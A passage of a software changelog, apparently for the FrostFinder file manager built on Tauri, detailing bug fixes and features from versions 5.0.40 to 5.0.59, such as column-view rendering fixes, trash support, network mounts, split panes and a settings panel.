`Node.insertBefore(newNode, referenceNode)` requires `referenceNode` to be a direct child of the parent. Calling it when `colList` was not yet appended to `colEl` threw an uncaught `DOMException`, which propagated out of `renderColumnView` and left the view blank with "Loading..." in the status bar.

r37 worked because the sort header was inserted **after** `colEl.appendChild(colList)`. The r59 refactor (moving `_colRO.observe` + double-RAF to after `container.appendChild`) accidentally reordered the sort header insertion above `colEl.appendChild(colList)` in the process.

Fix: restored correct order:
1. `colEl.appendChild(colList)` — colList becomes a child of colEl
2. `colEl.insertBefore(sortHdr, colList)` — now valid, prepends sort header before colList
3. `colEl.appendChild(resizeHandle)`
4. `container.appendChild(colEl)` — colEl enters live DOM
5. `_colRO.observe(colList)` + double-RAF — registered after live DOM insertion (r59 fix preserved)

---

## What's in 5.0.59

**No Rust recompile required.** `src/views.js` only.

### Fix — Column view blank after switching from any other view mode (`src/views.js`)

`_colRO.observe(colList)` (ResizeObserver) and the double-RAF initial paint were registered **before** `colEl.appendChild(colList)` and `container.appendChild(colEl)` — the element was not yet in the live DOM.

Two consequences on WebKit2GTK:

**1. ResizeObserver misses the first notification.** WebKit2GTK silently drops the initial size callback when `observe()` is called on a detached element. The RO only fires on *subsequent* size changes, so if the column reaches its final size in one layout pass (the normal case), the RO never fires and never repaints.

**2. double-RAF sees `colList.clientHeight = 0`.** A detached element has no layout dimensions. The fallback `VH = clientHeight || 400` fires, rows are painted at absolute positions 0–560 px — but `.col` has `contain:paint` in its CSS, which clips all content to the element's border box. With `.col` still at zero height (because it too was detached when layout ran), every row is invisible.

In r57 the inotify watcher storm (17 rapid `refreshColumns` calls per second) kept re-calling `_paintColList` until one call landed after layout settled and rows became visible. r58 fixed the storm with a 150ms debounce, removing the accidental repair.

**Fix:** moved both `_colRO.observe(colList)` and the double-RAF registration to immediately after `container.appendChild(colEl)` — the point where the element has its real layout dimensions. `colList.clientHeight` is now correct on the first RAF call, and the ResizeObserver receives the initial notification as designed.

---

## What's in 5.0.58

**No Rust recompile required.** `src/main.js` and `src/views.js`.

### Fix 1 — Column view clicks broken by inotify render storm (`src/main.js`)

The inotify watcher (wired in r56 via `listen('dir-changed', ...)`) was firing 15–20 rapid `refreshColumns()` calls per second on busy home directories (`.bash_history`, `.cache` writes). Each call ran `_patchEntries` which removes and repaints all visible row elements every ~67ms. Click events landing mid-repaint found no target element and were silently dropped, making column view navigation completely unresponsive.

Two fixes to the `dir-changed` listener:

**1. JS-side per-path debounce (150ms):** A `Map<path, timerId>` coalesces rapid burst events for the same directory into a single `refreshColumns()` call. The 150ms window absorbs the typical burst of 5–10 events from a single shell write touching `.bash_history`.

**2. `state.loading` guard:** Watcher events are dropped while `navigate()` is in progress (`state.loading === true`). The `navigate()` finally block already calls `watch_dir` + `render()`, so a concurrent watcher refresh is redundant and was causing a double-render on every navigation.

### Fix 2 — Gallery view broken after switching from column/list/icon view (`src/views.js`)

`host._galleryMeta` is a JavaScript property on the `#view-host` DOM element. Unlike `innerHTML`, JS properties are **not cleared** when another view clobbers gallery DOM via `host.innerHTML = '...'`. When switching Column → Gallery:

1. Column view destroys the gallery DOM (`host.innerHTML = '<div class="cols-wrap">...'`)
2. `host._galleryMeta` still holds the stale `{path, count}` from the last gallery render
3. `renderGalleryView()` sees the meta match, takes the incremental fast path
4. `host.querySelector('#gallery-strip')` returns `null` — the strip was destroyed
5. Gallery renders with no thumbnails and no click listener

Fix: added `&& host.querySelector('.gallery-wrap')` to the incremental update guard. If the gallery DOM was wiped by another view, the full rebuild always runs.

---

## What's in 5.0.58

**No Rust recompile required.** `src/main.js` only.

### Fix — Column view clicks broken by inotify render storm (`src/main.js`)

The inotify watcher (wired in r56 via `listen('dir-changed', ...)`) was firing 15–20 rapid-fire `refreshColumns()` calls per second on busy home directories (`.bash_history`, `.cache` writes). The Rust-side 300ms debounce prevents concurrent events per file, but multiple *distinct* file changes produce separate events that each pass through. Each `refreshColumns()` call runs `_patchEntries` which removes and repaints all visible row elements (~67ms intervals). Click events landing mid-repaint found no target element and were silently dropped, making column view navigation completely unresponsive.

Two fixes applied to the `dir-changed` listener:

**1. JS-side per-path debounce (150ms)**
A `Map<path, timerId>` coalesces rapid burst events for the same directory into a single `refreshColumns()` call. The 150ms window absorbs the typical burst of 5–10 events from a single shell write touching `.bash_history`.

**2. `state.loading` guard**
Watcher events are dropped while `navigate()` is in progress (`state.loading === true`). The `navigate()` finally block already calls `watch_dir` + `render()`, so a concurrent watcher refresh is redundant and was causing a double-render on every navigation.

---

## What's in 5.0.57

**No Rust recompile required.** `src/main.js` only.

### Fix — `ReferenceError: Can't find variable: i` on startup (`src/main.js`)

`renderSidebar()` called `allFavs.map(f => `...${i}...`)` — the map callback declared only `f` but used `i` (the index) inside the template literal. Chromium silently made `i` undefined; WebKit (used by Tauri on macOS and by some Linux WebKitGTK builds) throws a hard `ReferenceError`, which propagated out of `renderSidebar()` → `loadSidebar()` → `init()` before any content was rendered. Fixed by adding the index parameter: `allFavs.map((f,i) => ...`.

---

## What's in 5.0.56

**No Rust recompile required.** `src/main.js` and `src/views.js` only.

### Fix — Blank screen on startup (Tauri v2.10 API compatibility) (`src/main.js`, `src/views.js`)

Three incompatible uses of the Tauri JS API caused `init()` to throw before any content was rendered. `init().catch(console.error)` swallowed the error silently, leaving a permanently blank window.

**1. `getCurrentWindow()` called at module parse time**

Both `main.js` and `views.js` called `const appWindow = _getAppWindow()` at the top level — before the Tauri webview context is injected. In Tauri v2.10 this throws immediately, which propagates into the first `invoke()` call (`get_media_port`) and aborts `init()`.

Fix: `appWindow` is now declared as `let` and assigned inside `init()` (main.js) or via `injectDeps()` (views.js) after the context is ready.

**2. `appWindow.listen()` removed in Tauri v2**

`Window.listen()` does not exist in the Tauri v2 JS API. The four `appWindow.listen(...)` calls for `drives-changed`, `delete-progress`, `dir-changed`, and `tauri://drag-drop` all threw `appWindow.listen is not a function`. These are replaced with the top-level `listen()` already imported from `@tauri-apps/api/event`.

**3. `appWindow.startDragging()` renamed to `startDrag()`**

The titlebar drag handler called the v1 method name. Renamed to `startDrag()`.

**4. Visible startup error trap**

`init().catch(console.error)` is replaced with a handler that renders a visible error message in the window if startup fails, so future issues are diagnosable without opening devtools.

---

## What's in 5.0.55

**No Rust recompile required.** `vite.config.js` and `src-tauri/tauri.conf.json` only.

### Fix — Dev server fails to start if port 5173 is already in use

`vite.config.js` had `strictPort: true` on port 5173, causing `npm run tauri dev` to abort with `Error: Port 5173 is already in use` whenever another Vite project (or previous dev session) was still bound to that port. Both files updated to use **port 5174** instead:

- `vite.config.js` → `port: 5174`
- `src-tauri/tauri.conf.json` → `devUrl: "http://localhost:5174"`

If 5174 is also taken, the error message is the same — just kill the occupying process (`fuser -k 5174/tcp`) or change the port to any free value in both files.

---

## What's in 5.0.54

**No Rust recompile required.** `index.html` only.

### Fix — Blank screen on startup (`index.html`)

`<link rel="stylesheet" href="https://fonts.googleapis.com/...">` is a synchronous render-blocking request. The browser will not execute any JavaScript until the HTTP response arrives. On machines with no internet access, a slow network, DNS failure, or a restrictive firewall the page hangs indefinitely — sidebar stays empty, main view stays black, status bar stays on the static "Loading…" string from `index.html`.

**Fix:** replaced the blocking `<link rel="stylesheet">` with a `rel="preload" as="style"` + `onload` swap (the standard async font-load pattern). JS starts immediately regardless of whether the font request succeeds. Inter loads in the background when available; on failure the app falls back to the existing `--font` stack (`-apple-system`, `BlinkMacSystemFont`, `sans-serif`) with no visible difference.

---

## What's in 5.0.53 — Bug fixes & missing features

**No Rust recompile required for JS-only items. Rust recompile required** for WebDAV persistence.

### Fix — Dead `Ctrl+Shift+F` / `Ctrl+Shift+P` keyboard shortcuts (`src/main.js`)

`Ctrl+Shift+F` (Advanced Search) and `Ctrl+Shift+P` (Plugin Manager) are handled in the primary keydown listener with an early `return`. A second listener block—added in r42 for SFTP and FTP dialogs—used the same key letters, making them permanently unreachable. SFTP and FTP have been reassigned:

- **`Ctrl+Shift+H`** — Connect SFTP (SSH)
- **`Ctrl+Shift+J`** — Connect FTP

### Fix — WebDAV/Cloud mounts not persisted across restarts (`src-tauri/src/main.rs`)

SMB, SFTP, and FTP all save a JSON registry and restore on startup. WebDAV stored mounts in-memory only (`CLOUD_MOUNTS` static) — they disappeared on every quit. Added `cloud_registry_path()`, `cloud_registry_save()`, `cloud_registry_load()` matching the SMB pattern, wired into `mount_webdav` (save on connect) and `unmount_cloud` (save on disconnect). Startup now filters the registry by `/proc/mounts` and restores live entries, identical to the SMB restore block.

### Fix — SMB and WebDAV mounts missing from sidebar (`src/main.js`)

After connecting via `Ctrl+Shift+S` or `Ctrl+Shift+O`, the mount was only reachable by navigating manually. SFTP and FTP already inject a sidebar section via `renderSidebar()` — the same pattern is now applied for SMB (`get_smb_mounts` → "SMB" section) and WebDAV (`get_cloud_mounts` → "Cloud" section). Each entry has a ✕ disconnect button wired to `unmount_smb` / `unmount_cloud`.

### Feature — Saved searches (`src/main.js`)

The Advanced Search dialog (`Ctrl+Shift+F`) now has a **Save…** button. Clicking it prompts for a name and stores the query + options (regex, contents, hidden, root path) in `localStorage` as `ff_saved_searches`. Saved searches appear as a new **Saved Searches** section in the sidebar — clicking one runs it immediately; the ✕ button removes it.

### Fix — Keyboard shortcut cheatsheet incomplete (`src/main.js`)

`Ctrl+?` now lists all working shortcuts. Two new sections added:

- **Network:** `Ctrl+Shift+S`, `Ctrl+Shift+O`, `Ctrl+Shift+H`, `Ctrl+Shift+J`
- **System:** `Ctrl+N`, `Ctrl+I`, `Ctrl+Alt+T`, `Ctrl+Shift+U`, `Ctrl+Shift+Z`, `Shift+Delete`, `F3`, `F5`/`F6` (dual-pane)

---

## What's in 5.0.51

**Rust recompile required.** Struct fix only.

### Fix — `FileOpProgress` missing `bytes_done` / `bytes_total` fields (`src-tauri/src/main.rs`)

r46 added byte-level progress to `copy_files_batch` and `move_files_batch`, emitting `bytes_done` and `bytes_total`. The emit sites were updated but the `FileOpProgress` struct definition was not, causing four `E0560` compile errors in r50.

**Fix:** Added `bytes_done: Option<u64>` and `bytes_total: Option<u64>` with `skip_serializing_if` to the struct. No logic changes.

---

## What's in 5.0.50 — Roadmap Phases 3–4

**No Rust recompile required.** All JS and CSS.

### Feature — Pane B drag, drop, and context menu — Phase 3 (`src/main.js`)

The split pane is no longer read-only:

**Drag from pane B:** Every row in pane B is now `draggable`. Dragging an entry creates a proper `dragState` and floating badge, so it can be dropped onto any column, list row, or icon in the main pane using the existing `setupDropTarget` infrastructure. Drag ends correctly clear `dragState` and fade the badge.

**Drop into pane B folders:** Directory rows in pane B are registered with `setupDropTarget(row, entry.path)`, so you can drag files from the main pane directly onto a folder in pane B to move or copy them there.

**Pane B as a drop target:** The entire pane B host is also a drop target pointing at `_paneB.path`, so dropping onto empty space moves/copies to the current pane B folder.

**Right-click context menu in pane B:** Right-clicking any pane B row shows a menu with:
- **Open** — navigate (dir) or open (file)
- **Open in Main Pane** — navigates the main pane to the folder
- **Copy to Main Pane** / **Move to Main Pane** — copies/moves the entry to `state.currentPath` with progress bar
- **Copy Path** — to clipboard
- **Delete** — moves to Trash with confirm

### Feature — Settings panel `Ctrl+,` — Phase 4 (`src/main.js`)

A full settings overlay with 5 sections:

| Section | Settings |
|---|---|
| **General** | Single-click open, show hidden by default, confirm before delete, default icon size |
| **Appearance** | Sidebar width, preview panel width, slideshow interval |
| **Search** | Include hidden by default, max results |
| **Network** | SFTP timeout, FTP passive mode default |
| **Advanced** | Reset onboarding, clear path history, clear thumbnail cache, verbose logging |

All settings read from and write to `localStorage` immediately on change. CSS variables are updated live for layout settings. Accessible via `Ctrl+,` or the cheatsheet.

---

## What's in 5.0.49 — Roadmap Phase 2

**No Rust recompile required.** All JS and CSS.

### Fix — Trash folder hides `.trashinfo` metadata files (`src/main.js`)

When browsing `~/.local/share/Trash` (or any path containing `/.local/share/Trash`), `getVisibleEntries()` now filters out files ending in `.trashinfo`. The raw trash filesystem showed both the deleted file and its metadata sidecar, which was confusing. The restore flow continues to use `trash_list` which reads `.trashinfo` files directly via Rust, so restore still works correctly.

### Feature — Multi-window title disambiguation (`src/main.js`)

When multiple FrostFinder windows are open, the titlebar now shows `FrostFinder — foldername [2]`, `[3]`, etc. for windows beyond the first. Window numbering uses `BroadcastChannel` at startup to discover other open windows and assign the next available number. The number is stored in `sessionStorage` so it survives navigate calls but resets when the window closes.

### Fix — SFTP reconnect shows clear message for password-auth failures (`src/main.js`)

The ↻ reconnect button in the sidebar only has credentials for key-based auth. If the connection fails with a permission/auth error, the toast now says “password auth requires reconnecting via the SFTP dialog” instead of the raw error string.

### Feature — Batch rename full preview table (`src/views.js`)

The preview area in the Batch Rename dialog is now a full-width scrollable table with **Before** and **After** columns. All files are shown (not just the first 12). Unchanged files are shown at 40% opacity with `=` instead of `→`. Errors show in red. A count badge above the table shows how many files will actually be renamed and how many have errors.

---

## What's in 5.0.48 — Roadmap Phases 1–2

**No Rust recompile required.** All JS and CSS.

### Feature — Copy path to clipboard (`src/main.js`)
Right-click any file or folder → **Copy Path** copies the absolute path to the system clipboard. Right-click on the background → **Copy Current Path** copies the current directory. Both show a "Path copied" toast.

### Feature — Tab key switches split-pane focus (`src/main.js`)
When the split pane is open, pressing **Tab** toggles keyboard focus between the main pane and pane B. The active pane receives all further keyboard navigation. Ctrl+Tab still cycles browser tabs as before.

### Feature — Gallery slideshow progress bar (`src/views.js`)
A thin blue bar at the bottom of the gallery toolbar fills over the slideshow interval, giving a visual countdown to the next auto-advance. Resets on each advance. Disappears when slideshow is stopped.

### Feature — Column view sort indicator (`src/views.js`)
The active (rightmost) column now shows a small header bar displaying the current sort: `Name ↑`, `Date ↓`, `Size ↑`, `Kind ↑`. Clicking it cycles through Name → Date → Size → Kind, reversing on the last step, then wrapping back. Calls `saveSortState()` and `render()` immediately.

### Feature — Preview panel drag-to-resize (`src/main.js`)
A 5px invisible drag handle sits at the left edge of the preview panel. Dragging it resizes the panel between 160px and 600px. New width is saved to `localStorage` as `ff_preview_w` and restored on next launch. Double-clicking the handle resets to 280px (the default).

### Feature — Compression format picker (`src/main.js`)
Right-click → Compress no longer silently produces a `.zip`. A dialog lets you pick: **ZIP** (universal), **TAR.GZ** (standard Unix), **TAR.BZ2** (better compression), **TAR.XZ** (best compression). The filename field is pre-filled; the extension is appended automatically if missing.

---

**Roadmap status:**
- Phase 1 — ✓ Complete (copy path, Tab pane, slideshow bar, col sort, preview resize, compression picker)
- Phase 2 — Partial (preview resize ✓, compression picker ✓; trash view, bulk rename preview, multi-window titles — next session)
- Phase 3 — Pending (split-pane drag between panes)
- Phase 4 — Pending (settings panel)

---

## What's in 5.0.47 — Phase 4

**Rust recompile required** (`src-tauri/src/main.rs` — new `diff_files` command).

### Feature — Split-pane dual-panel mode (`src/main.js`, `index.html`, `src/style.css`)

**Ctrl+\\** (or the ╨ button in the toolbar) toggles a second independent pane alongside the main view. The pane has its own path, navigation history, and entry list. Features:
- Back/forward buttons + path label in the pane header
- ⇄ sync button to jump pane B to the current main-pane folder
- • toggle hidden files in pane B independently
- Drag the divider to resize; double-click divider to reset to 50/50
- Split ratio and active state persisted in localStorage
- Clicking any row in pane B focuses it; double-click a folder navigates it; double-click a file opens it in the default app

### Feature — File comparison / diff (`src/main.js`, `src-tauri/src/main.rs`)

Select exactly 2 files, right-click, choose **Compare files…** to open a unified diff dialog. Features:
- Uses `diff -u` with file labels for clean unified output
- Lines coloured: `+` additions green, `-` deletions red, `@@` hunks purple, headers grey
- Footer shows `+N additions / −N deletions` summary
- Binary files detected via null-byte scan and shown as undifffable
- Identical files show a green “Files are identical” message

### Feature — Onboarding hints on first launch (`src/main.js`)

A 4-page overlay appears once on first launch (guarded by `localStorage.ff_onboarded`). Pages cover keyboard navigation, mouse/drag gestures, search, and power features. Arrow keys or Next/Back buttons advance pages. Escape or “Get started” dismisses it permanently. The overlay fades out on close.

---

## What's in 5.0.46 — Phase 3

**Rust recompile required** (`src-tauri/src/main.rs` — `FileOpProgress` struct gains `bytes_done` and `bytes_total` fields; both `copy_files_batch` and `move_files_batch` now stat files and emit byte counts).

### Feature — Copy/move progress with speed and ETA (`src-tauri/src/main.rs`, `src/main.js`)

`FileOpProgress` now carries `bytes_done: Option<u64>` and `bytes_total: Option<u64>`. Both batch commands pre-compute total bytes by statting each source file, then accumulate `bytes_done` as each file completes. The JS progress listener uses these to display:

`Copying 3 / 12 · 240 MB / 1.4 GB · 48 MB/s · 24s left`

Speed is calculated from elapsed wall-clock time (suppressed for the first 500ms to avoid misleading spikes). ETA shows seconds below 60s and minutes above. Falls back gracefully to the old `N / Total` format if byte data is absent (e.g. for moves across filesystems where size is zero).

### Feature — SFTP dialog pre-fills saved credentials (`src/main.js`)

`showSftpDialog()` now calls `get_sftp_mounts()` after rendering and pre-fills host, port, username, remote path, and key file path from the most recently connected mount. Fields are only pre-filled if empty, so typing still takes priority. The auth mode radio button switches to SSH Key if a key path is stored.

### Feature — FTP dialog pre-fills saved credentials (`src/main.js`)

Same pattern for `showFtpDialog()` — pre-fills host, port, username, and remote path from the last FTP mount.

### Feature — SFTP reconnect button in sidebar (`src/main.js`)

Each SFTP mount entry in the sidebar now has a ↻ button alongside the ✕ disconnect button. Clicking it re-calls `mount_sftp` with the host/port/user/key stored in `data-*` attributes. Uses key-based auth (password not stored); password-protected mounts will fail and show a toast. The button shows `…` while connecting and restores on failure.

---

## What's in 5.0.45 — Phase 2

**No Rust recompile required.** All JS/CSS.

### Feature — Gallery slideshow mode (`src/views.js`)
A **▶ Slideshow** button appears in the gallery toolbar. Clicking it (or pressing **S**) auto-advances through all non-folder items in the current directory every 3 seconds. Pressing **⏹ Stop** or S again pauses it. The slideshow stops automatically when navigating to a different folder.

### Feature — Plugin manager UI (`src/main.js`)
**Ctrl+Shift+P** opens the Plugin Manager dialog. Shows all installed plugins with name, command template, and file match pattern. Each plugin has a **Remove** button. The Add panel lets you create a new plugin with name, command (using `{path}`, `{name}`, `{dir}`, `{ext}` placeholders), file match glob, multi-file flag, and confirm-before-run checkbox. Plugins are saved to `~/.local/share/frostfinder/plugins.json` via `save_plugins`.

### Feature — Bookmarks drag-to-reorder (`src/main.js`)
Custom sidebar favorites (non-builtin) now have a `⠿` drag handle. Drag any custom bookmark up or down in the Favorites list to reorder it. Order is saved immediately to localStorage.

### Feature — Quick Look "Open With…" button (`src/ql-window.js`, `ql.html`)
A second button **With…** appears next to the existing Open button in the Quick Look title bar. Clicking it lists installed apps via `list_apps_for_file` and shows a picker overlay. Selecting an app calls `open_with_app`. The existing Open button is unchanged (opens in default app).

### Feature — Middle-click folder opens new tab (`src/views.js`)
Middle-clicking a folder row in **list view** now opens it in a new tab, matching the behaviour already added to column view in r44.

### Fix — Slideshow interval configurable via `state._galSSInterval` (default 3s)
Set `state._galSSInterval = 5` in the browser console to change the interval per session.

---

## What's in 5.0.44 — Phase 1

**No Rust recompile required.** All JS/CSS. Phase 1 of 4 planned improvement passes.

### Feature — Open folder in new tab (`src/main.js`, `src/views.js`)
- **Right-click menu** on any folder now has **Open in New Tab**
- **Ctrl+Enter** on a selected folder opens it in a new tab (same selection mechanics as Enter)
- **Middle-click** on a folder row in column view opens it in a new tab

### Feature — Move to… / Copy to… folder picker (`src/main.js`)
- Right-click any file/folder to get **Move to…** and **Copy to…** in the context menu
- A dialog shows the last 8 visited paths as quick-pick buttons, plus a free-text path input
- For copies, the conflict dialog (Replace / Skip / Cancel) fires before the operation
- Progress bar, undo/redo, and toast notifications work identically to clipboard paste

### Feature — Selection total size in status bar (`src/views.js`)
- When 2+ items are selected, the status bar now shows total size alongside the count
- Format: `5 selected of 142 · 2.4 GB`
- Only counts files that have size metadata populated (fast listings from column view may show 0)

### Feature — Search result name highlighting (`src/views.js`)
- The matching substring in search result filenames is highlighted in amber
- Works for plain text queries; regex queries (prefixed `regex: `) show no highlight since the raw pattern may not map cleanly to highlighted spans

### Feature — Drag-op badge fades on drop (`src/main.js`)
- The floating Move/Copy badge now fades out over 400ms after a drop instead of vanishing instantly, giving brief visual confirmation of the operation

---

## What's in 5.0.43

**No Rust recompile required.** Three JS fixes and one JS feature.

### Fix — Gallery view broken: clicking gallery icon did nothing (`src/views.js`)

**Root cause:** `_buildBarHtml` was assigned as `_buildBarHtml=()=>\`...\`` with no `let`/`const`/`var` declaration. In ES modules (strict mode), assigning to an undeclared variable throws a `ReferenceError`. This crashed `renderGalleryView` before it wrote any HTML to `host`, so switching to gallery view left the view-host completely blank.

**Fix:** Added `let` declaration: `let _buildBarHtml=()=>\`...\``.

---

### Fix — Tag context menu using old `set_file_tags` instead of `set_file_tags_v2` (`src/main.js`)

r40–r42 migrated tag storage to `set_file_tags_v2` / `get_file_tags_v2`. One call site in the context menu color-tag handler was missed. Fixed.

---

### Feature — Trash restore from trash folder (`src/main.js`)

When browsing `~/.local/share/Trash/files`, the trash banner now:
- Shows the item count via `trash_item_count`
- Adds a **Restore selected** button that uses `trash_list` to match selected items to their `.trashinfo` entries, calls `check_trash_restore_conflicts` to detect path collisions, and calls `trash_restore_with_resolution` (renaming conflicting items automatically)

---

### Feature — Advanced Search dialog `Ctrl+Shift+F` (`src/main.js`)

Opens a dialog with:
- Query field (pre-filled with current search)
- **Use regex** checkbox — passes `use_regex: true` to `search_advanced`
- **Search file contents** checkbox — passes `search_contents: true` (grep-style)
- **Include hidden** checkbox
- **Search in** path field (defaults to first column / current path)

Results populate `state.searchResults` and render in the active view mode.

---

## What's in 5.0.42

**Rust recompile required** (`src-tauri/src/main.rs` — new FTP, tag DB, and plugin commands). All other changes are JavaScript/CSS.

---

### Fix — Compilation Error with Tauri 2.10

**Root cause:** Tauri 2.10 introduced a macro expansion issue where `#[tauri::command]` on a `pub fn` would create a duplicate macro definition (`__cmd__<name>`). The error manifested as "the name is defined multiple times" for all r40-r42 commands.

**Fix:** Changed `pub fn` → `fn` for 24 command functions (trash, SFTP, FTP, permissions, window, disk usage, search, tags v2, video codec, plugins). Non-public functions work identically with Tauri IPC. Also fixed missing JS calls: `get_file_tags` → `get_file_tags_v2`, `set_file_tags` → `set_file_tags_v2`.

---

### Fix — Video Codec Badge in Preview Panel

Video files selected in the preview panel now show a row of metadata badges: codec name, resolution (with label like 1080p / 4K), frame rate, duration, bitrate, audio codec, and pixel format. Badges appear asynchronously via `probe_video_codec` (already in Rust since r34, never wired until now). If ffprobe is not installed, the badge row is silently omitted.

No new Rust commands.

---

### Feature — FTP Support (`Ctrl+Shift+P`)

Mounts plain FTP (and FTPS / explicit TLS) servers via `curlftpfs` (FUSE), mirroring the SFTP dialog.

- Anonymous login checkbox
- Passive mode and explicit FTPS toggles
- Mounts appear in the sidebar under Network; right-click → Disconnect
- Persisted across restarts in `~/.local/share/frostfinder/ftp_mounts.json`

New Rust commands: `mount_ftp`, `unmount_ftp`, `get_ftp_mounts`.  
Requires: `curlftpfs` installed.

---

### Feature — Tag xattr Fallback Database

Tags are now durable on filesystems that do not support extended attributes (FAT32, exFAT, most FTP/SFTP mounts).

Write path: try xattr first; fall back to SQLite DB at `~/.local/share/frostfinder/tags.db`.  
Read path: try xattr first; fall back to DB.  
Copy/move: DB tag entries migrate to the new path automatically.

JS change: `get_file_tags` → `get_file_tags_v2`, `set_file_tags` → `set_file_tags_v2` (same signatures, one sed command applies the rename).

New Rust commands: `get_file_tags_v2`, `set_file_tags_v2`, `migrate_tag_path`.  
New Cargo dependency: `rusqlite = { version = "0.31", features = ["bundled"] }`.

---

### Feature — Accessibility / ARIA Audit

Comprehensive ARIA and keyboard accessibility pass across all views:

- File list containers get `role="listbox"`, `aria-label="Files in [folder]"`, `aria-multiselectable="true"`
- Every file row gets `role="option"`, `aria-selected`, `aria-label`, `tabindex="0"`
- Sidebar gets `role="navigation"`, section titles get `role="heading"`, items get `aria-current="page"` when active
- All toolbar buttons get descriptive `aria-label` attributes
- All modal dialogs get `role="dialog"`, `aria-modal="true"`, `aria-labelledby`, focus trap, and autofocus on open
- A visually-hidden `role="status"` live region announces navigation, search results, and file operations to screen readers
- `announceA11y(msg)` helper added — hook into `showToast()` to cover all toasts automatically
- Keyboard navigation: arrow keys move focus and selection, Home/End jump to ends, Space toggles selection, Enter opens

---

### Feature — Localization / i18n Infrastructure

A lightweight translation system with no external runtime dependency:

- `t(key, vars?)` function with `{variable}` substitution and automatic pluralization (`_plural` key variant)
- Locale files in `src/locales/{lang}.json`; `en.json` ships with 100+ strings covering all UI surfaces
- Auto-detected from `navigator.language`; overridable via Settings → Language (persisted in localStorage)
- Falls back to English for missing keys; falls back to the key name itself if English is missing too
- `initI18n()` called once at startup before any UI renders

---

### Feature — Plugin / Custom Actions System

Users can define shell commands that appear in the right-click context menu.

- Each action has a name, icon, file pattern (glob), shell command, and options (run per file, confirm before run, show completion toast)
- Variables substituted into the command: `{path}`, `{name}`, `{dir}`, `{ext}`
- Actions only appear for files matching their glob pattern (`*.png`, `*.{jpg,png}`, `*`)
- "Manage Custom Actions" in the Tools/Settings menu opens a full editor (add, edit, delete)
- Plugins stored in `~/.local/share/frostfinder/plugins.json`
- Commands run via `sh -c` with the current folder as working directory

New Rust commands: `load_plugins`, `save_plugins`, `run_plugin_command`.

---

### Feature — Pane State Memory Per Tab

Dual-pane state is now saved and restored per tab:

- Each pane's path, view mode, and scroll position are stored in the tab object
- Switching tabs restores both pane paths (no more "pane 1 resets to home")
- Divider split fraction is also saved per tab
- Dual-pane on/off state is preserved per tab

No new Rust commands.
## What's in 5.0.41

**Rust recompile required** (`src-tauri/src/main.rs` — new permissions, disk usage, search, and trash-conflict commands). All other changes are JavaScript/CSS.

---

### Feature — Terminal Integration (`Ctrl+Alt+T`)

Opens the system terminal at the current folder. Also available in the right-click context menu as "Open Terminal Here" (on both the background and on right-clicked directories).

Terminal detection order: `$TERMINAL` env var → gnome-terminal → konsole → xfce4-terminal → alacritty → kitty → wezterm → foot → xterm.

New Rust command: `open_terminal`.

---

### Feature — File Permissions UI (`Ctrl+I`)

A Properties dialog shows full file metadata and editable permissions:
- Read/write/execute checkboxes for owner, group, and others
- Numeric octal input (synced with checkboxes bidirectionally)
- Owner and group name fields with Apply button
- `chmod` and `chown` applied on confirm; descriptive error shown if permission denied

Also accessible via right-click → Properties.

New Rust commands: `get_file_permissions`, `chmod_entry`, `chown_entry`.
New Cargo dependency: `libc = "0.2"` (if not already present).

---

### Feature — Multiple Windows (`Ctrl+N`)

Opens a new independent FrostFinder window at the current folder (or at a specific folder via right-click → Open in New Window on directories).

Each window has its own navigation state. Tauri window labels are unique UUIDs so they don't collide. Window titles already track the current folder (from r38), making multiple windows distinguishable in the taskbar.

New Rust command: `open_new_window`.
New capability required: `window:allow-create` in `src-tauri/capabilities/main.json`.

---

### Feature — Disk Usage Visualization (`Ctrl+Shift+U`)

Opens a dialog showing a squarified treemap and a sorted bar list of all immediate children by recursive size. Clicking a directory in either view navigates to it and closes the dialog.

Also available via right-click → Show Disk Usage.

New Rust command: `scan_dir_sizes`.

---

### Feature — Advanced Search Filters

A gear button beside the search input reveals an expanded filter bar:
- **Scope** — This folder / Subfolders / Everywhere (replaces fixed subtree search)
- **Regex** — Treat the query as a regular expression
- **In contents** — Search inside file text (capped at 10 MB per file; binary files skipped)
- **Hidden files** — Include dotfiles
- **Save search** — Name and persist any query + options combination; saved searches appear in the sidebar and can be re-run in one click

New Rust command: `search_advanced`.
New Cargo dependency: `regex = "1"` (if not already present).

---

### Feature — Undo History Panel (`Ctrl+Shift+Z`)

A slide-in side panel lists all operations on the undo stack with type icon, label, and a "next" badge on the top entry. Clicking any entry undoes all operations down to that point. A "Clear History" button empties the stack.

The panel auto-refreshes whenever an undo entry is pushed or popped.

No new Rust commands.

---

### Feature — Resizable Dual Panes

The `.pane-divider` between the two panes (added in r40) is now interactive:
- Drag to freely resize the left/right split
- Double-click to reset to 50/50
- Arrow keys nudge the divider by 5% increments when focused
- Preferred split is persisted in `localStorage`

No new Rust commands.

---

### Fix — Trash Restore Conflict Dialog

Previously, restoring a trash item whose original path was already occupied caused a cryptic error and nothing was restored.

The restore flow now pre-checks all items before invoking Rust. For each conflict, a dialog offers:
- **Replace** — overwrite the existing file
- **Keep both** — restore with a `(restored)` suffix
- **Skip** — leave in Trash

Bulk "Replace all / Keep all / Skip all" buttons handle multiple conflicts at once.

New Rust commands: `check_trash_restore_conflicts`, `trash_restore_with_resolution`.
## What's in 5.0.40

**Rust recompile required** (`src-tauri/src/main.rs` — new trash and SFTP commands). All other changes are JavaScript/CSS.

---

### Feature — Trash / Recycle Bin

Files deleted with the `Delete` key are now moved to the XDG Trash
(`~/.local/share/Trash/`) rather than permanently erased. The original path
and deletion timestamp are stored in a `.trashinfo` sidecar file per the
freedesktop spec.

- **Trash sidebar entry** — A "Trash" item appears at the bottom of the
  Locations section with a live item-count badge.
- **Trash view** — Navigating to Trash shows a flat list with filename,
  original path, deletion date, and size columns.
- **Restore** — Per-row Restore button or "Restore Selected" bulk button
  returns items to their original paths.
- **Empty Trash** — "Empty Trash" button in the toolbar permanently deletes
  all Trash contents after a confirmation prompt.
- **Shift+Delete** — Still triggers permanent deletion (old `delete_items_stream`
  path), with a confirmation dialog.

New Rust commands: `trash_items`, `trash_list`, `trash_restore`, `trash_empty`,
`trash_item_count`.

---

### Feature — Drag-and-drop undo

Drag-and-drop moves and copies are now tracked by the undo stack. Pressing
`Ctrl+Z` after a drag-move reverses the move (files returned to their source
folder). Pressing `Ctrl+Z` after a drag-copy deletes the copies that were
created. Both use the same undo entry shape as paste operations.

No new Rust commands — uses existing `move_files_batch`, `copy_files_batch`,
and `delete_items`.

---

### Feature — Dual-pane view (`F3`)

Press `F3` to split the file area into two independent side-by-side panes.

- Each pane maintains its own path, selection, view mode, and sort state.
